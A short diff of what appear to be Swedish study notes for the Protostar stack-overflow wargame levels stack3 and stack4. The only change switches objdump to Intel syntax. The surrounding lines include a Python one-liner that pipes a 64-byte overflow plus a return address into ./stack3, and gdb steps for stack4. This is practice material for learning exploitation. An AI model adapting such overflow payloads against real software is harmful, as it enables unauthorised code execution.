@@ -65,7 +65,7 @@ echo $(python -c "print('A'*64 + '$' + chr(132) + chr(4) + chr(8))") | ./stack3
 chsh -s /bin/bash      -> Ändra shell till bash så gdb kör med det
 bash
 logout                   -> Måste logga ut för att env har SHELL som bash
-objdump -d ./stack4     -> Adress för win = 080483f4
+objdump -M intel -d ./stack4     -> Adress för win = 080483f4
 gdb ./stack4
 break main
 r < <(python -c 'print("A"*64)')
